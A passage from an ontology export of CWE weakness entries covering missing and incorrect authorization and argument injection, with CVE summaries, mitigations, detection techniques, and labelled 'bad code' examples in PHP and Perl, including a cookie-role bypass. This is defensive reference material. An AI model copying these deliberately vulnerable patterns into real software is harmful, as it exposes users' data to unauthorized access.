        rdfs:comment "The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1018_Manage_User_Sessions,
     
     Annotations: rdfs:comment "Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault."^^xsd:string
                 
                 references  CVE-2003-0777,
     
     Annotations: rdfs:comment "Chain: File server crashes when sent a \"find next\" request without an initial \"find first.\""^^xsd:string
                 
                 references  CVE-2004-0829,
     
     Annotations: rdfs:comment "Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion."^^xsd:string
                 
                 references  CVE-2004-2164,
     
     Annotations: rdfs:comment "FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in."^^xsd:string
                 
                 references  CVE-2005-3296,
     
     Annotations: rdfs:comment "Chain: Authentication bypass by skipping the first startup step as required by the protocol."^^xsd:string
                 
                 references  CVE-2005-3327,
     
     Annotations: rdfs:comment "Attacker can access portions of a restricted page by canceling out of a dialog."^^xsd:string
                 
                 references  CVE-2007-3012,
     
     Annotations: rdfs:comment "Ticket-tracking system does not enforce a permission setting."^^xsd:string
                 
                 references  CVE-2009-5056,
     
     Annotations: rdfs:comment "FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first."^^xsd:string
                 
                 references  CVE-2010-2620,
     
     Annotations: rdfs:comment "Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination."^^xsd:string
                 
                 references  CVE-2011-0348,
     ID  "841"^^xsd:positiveInteger
    
    
Individual: CWE-862_Missing_Authorization

    Annotations: 
        rdfs:comment "Alternate Terms
AuthZ:	
\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is also distinct from \"AuthC,\" which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."^^xsd:string,
        rdfs:comment "Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.

When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution."^^xsd:string,
        rdfs:comment "Background Details:
An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."^^xsd:string,
        rdfs:comment "The software does not perform an authorization check when an actor attempts to access a resource or perform an action."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions."^^xsd:string
                 
                 references  CVE-2001-1155,
     
     Annotations: rdfs:comment "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied."^^xsd:string
                 
                 references  CVE-2005-2801,
     
     Annotations: rdfs:comment "OS kernel does not check for a certain privilege before setting ACLs for files."^^xsd:string
                 
                 references  CVE-2005-3623,
     
     Annotations: rdfs:comment "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header."^^xsd:string
                 
                 references  CVE-2006-6679,
     
     Annotations: rdfs:comment "Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries."^^xsd:string
                 
                 references  CVE-2007-2925,
     
     Annotations: rdfs:comment "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access."^^xsd:string
                 
                 references  CVE-2008-3424,
     
     Annotations: rdfs:comment "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions."^^xsd:string
                 
                 references  CVE-2008-4577,
     
     Annotations: rdfs:comment "System monitoring software allows users to bypass authorization by creating custom forms."^^xsd:string
                 
                 references  CVE-2008-5027,
     
     Annotations: rdfs:comment "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect."^^xsd:string
                 
                 references  CVE-2008-6123,
     
     Annotations: rdfs:comment "Product does not check the ACL of a page accessed using an \"include\" directive, allowing attackers to read unauthorized files."^^xsd:string
                 
                 references  CVE-2008-6548,
     
     Annotations: rdfs:comment "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client."^^xsd:string
                 
                 references  CVE-2008-7109,
     
     Annotations: rdfs:comment "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges."^^xsd:string
                 
                 references  CVE-2009-0034,
     
     Annotations: rdfs:comment "Gateway uses default \"Allow\" configuration for its authorization settings."^^xsd:string
                 
                 references  CVE-2009-2213,
     
     Annotations: rdfs:comment "Terminal server does not check authorization for guest access."^^xsd:string
                 
                 references  CVE-2009-2282,
     
     Annotations: rdfs:comment "Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users."^^xsd:string
                 
                 references  CVE-2009-2960,
     
     Annotations: rdfs:comment "Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords."^^xsd:string
                 
                 references  CVE-2009-3168,
     
     Annotations: rdfs:comment "Database server does not use appropriate privileges for certain sensitive operations."^^xsd:string
                 
                 references  CVE-2009-3230,
     
     Annotations: rdfs:comment "Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request."^^xsd:string
                 
                 references  CVE-2009-3597,
     
     Annotations: rdfs:comment "Content management system does not check access permissions for private files, allowing others to view those files."^^xsd:string
                 
                 references  CVE-2009-3781,
     ID  "862"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Authorization weaknesses may arise when a single-user application is ported to a multi-user environment."^^xsd:string, 
                 rdfs:comment "Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.
Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role."^^xsd:string, 
                 rdfs:comment "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor."^^xsd:string, 
                 rdfs:comment "For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.
One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
- Formal Methods / Correct-By-Construction
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This function runs an arbitrary SQL query on a given database, returning the result of the query.

(bad code)
Example Language: PHP 
function runEmployeeQuery($dbName, $name){
mysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName);
//Use a prepared statement to avoid CWE-89 
$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
$preparedStatement->execute(array(':name' => $name));
return $preparedStatement->fetchAll();
}
/.../ 

$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);
While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database."^^xsd:string, 
                 rdfs:comment "Example 2
The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.

Example Language: Perl  /* (bad code) */
sub DisplayPrivateMessage {
my($id) = @_;
my $Message = LookupMessageObject($id);
print \"From: \" . encodeHTML($Message->{from}) . \"<br>\\n\";
print \"Subject: \" . encodeHTML($Message->{subject}) . \"\\n\";
print \"<hr>\\n\";
print \"Body: \" . encodeHTML($Message->{body}) . \"\\n\";
}

my $q = new CGI;
# For purposes of this example, assume that CWE-309 and 

# CWE-523 do not apply. 
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(\"invalid username or password\");
}

my $id = $q->param('id');
DisplayPrivateMessage($id);
While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.

One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic."^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host Application Interface Scanner
- Fuzz Tester
- Framework-based Fuzzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 installation  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Files or Directories"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.
Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.
Effectiveness: Limited"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
Effectiveness: Moderate
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 system_configuration  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Database Server"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Web Server"^^xsd:string
    
    
Individual: CWE-863_Incorrect_Authorization

    Annotations: 
        rdfs:comment "Alternate Terms
AuthZ:	
\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is also distinct from \"AuthC,\" which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."^^xsd:string,
        rdfs:comment "Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.

When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution."^^xsd:string,
        rdfs:comment "Background Details:
An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."^^xsd:string,
        rdfs:comment "The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions."^^xsd:string
                 
                 references  CVE-2001-1155,
     
     Annotations: rdfs:comment "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied."^^xsd:string
                 
                 references  CVE-2005-2801,
     
     Annotations: rdfs:comment "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header."^^xsd:string
                 
                 references  CVE-2006-6679,
     
     Annotations: rdfs:comment "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access."^^xsd:string
                 
                 references  CVE-2008-3424,
     
     Annotations: rdfs:comment "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions."^^xsd:string
                 
                 references  CVE-2008-4577,
     
     Annotations: rdfs:comment "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect."^^xsd:string
                 
                 references  CVE-2008-6123,
     
     Annotations: rdfs:comment "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client."^^xsd:string
                 
                 references  CVE-2008-7109,
     
     Annotations: rdfs:comment "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges."^^xsd:string
                 
                 references  CVE-2009-0034,
     
     Annotations: rdfs:comment "Gateway uses default \"Allow\" configuration for its authorization settings."^^xsd:string
                 
                 references  CVE-2009-2213,
     ID  "863"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Authorization weaknesses may arise when a single-user application is ported to a multi-user environment."^^xsd:string, 
                 rdfs:comment "Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.
Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role."^^xsd:string, 
                 rdfs:comment "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor."^^xsd:string, 
                 rdfs:comment "For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.
One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
- Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.

Example Language: PHP /* (bad code) */
$role = $_COOKIES['role'];
if (!$role) {
$role = getRole('user');
if ($role) {
// save the cookie to send out in future responses
setcookie(\"role\", $role, time()+60*60*2);
}
else{
ShowLoginScreen();
die(\"\\n\");
}
}
if ($role == 'Reader') {
DisplayMedicalHistory($_POST['patient_ID']);
}
else{
die(\"You are not Authorized to view this record\\n\");
}
The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the \"role\" cookie to the value \"Reader\". As a result, the $role variable is \"Reader\", and getRole() is never invoked. The attacker has bypassed the authorization system."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses."^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host Application Interface Scanner
- Fuzz Tester
- Framework-based Fuzzer
- Forced Path Execution
- Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 installation  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."^^xsd:string
                 
                 integrity  "Modify Files or Directories"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.
Generally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.
Effectiveness: Limited"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Manual Analysis

This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
Effectiveness: Moderate

Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."^^xsd:string
                 
                 system_configuration  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Database Server"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Web Server"^^xsd:string
    
    
Individual: CWE-88_Argument_Injection_or_Modification

    Annotations: 
        rdfs:comment "Affected Resources:
System Process"^^xsd:string,
        rdfs:comment "Relationship:
At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags."^^xsd:string,
        rdfs:comment "The software does not sufficiently delimit the arguments being passed to a component in another control sphere, allowing alternate arguments to be provided, leading to potentially security-relevant changes."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Canonical Example"^^xsd:string
                 
                 references  CVE-1999-0113,
     
     Annotations: rdfs:comment "Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands."^^xsd:string
                 
                 references  CVE-2001-0150,
     
     Annotations: rdfs:comment "Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed."^^xsd:string
                 
                 references  CVE-2001-0667,
     
     Annotations: rdfs:comment "Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible."^^xsd:string
                 
                 references  CVE-2001-1246,
     
     Annotations: rdfs:comment "Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands."^^xsd:string
                 
                 references  CVE-2002-0985,
     
     Annotations: rdfs:comment "Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an \"hcp://\" URL."^^xsd:string
                 
                 references  CVE-2003-0907,
     
     Annotations: rdfs:comment "Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs."^^xsd:string
                 
                 references  CVE-2004-0121,
     
     Annotations: rdfs:comment "Web browser doesn't filter \"-\" when invoking various commands, allowing command-line switches to be specified."^^xsd:string
                 
                 references  CVE-2004-0411,
     
     Annotations: rdfs:comment "Web browser doesn't filter \"-\" when invoking various commands, allowing command-line switches to be specified."^^xsd:string
                 
                 references  CVE-2004-0473,
     
     Annotations: rdfs:comment "Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file."^^xsd:string
                 
                 references  CVE-2004-0480,
     
     Annotations: rdfs:comment "SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option."^^xsd:string
                 
                 references  CVE-2004-0489,
     
     Annotations: rdfs:comment "Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via \"--\" style options in the q_Host parameter."^^xsd:string
                 
                 references  CVE-2005-4699,
     
     Annotations: rdfs:comment "Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues."^^xsd:string
                 
                 references  CVE-2006-1865,
     
     Annotations: rdfs:comment "Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
                 
                 references  CVE-2006-2056,
     
     Annotations: rdfs:comment "Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
                 
                 references  CVE-2006-2057,
     
     Annotations: rdfs:comment "Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
                 
                 references  CVE-2006-2058,
     
